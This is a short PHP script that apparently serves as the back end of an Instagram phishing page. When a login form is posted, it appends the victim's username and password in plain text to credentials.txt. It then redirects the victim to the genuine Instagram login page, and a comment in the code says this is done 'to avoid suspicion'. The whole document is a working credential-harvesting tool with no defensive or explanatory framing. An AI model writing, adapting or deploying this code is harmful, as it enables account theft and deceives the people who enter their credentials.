<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save credentials to a file or database
    $file = 'credentials.txt';
    $data = $username . ':' . $password . "\n";
    file_put_contents($file, $data, FILE_APPEND);

    // Redirectthe user to the real Instagram login page to avoid suspicion
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
}
?>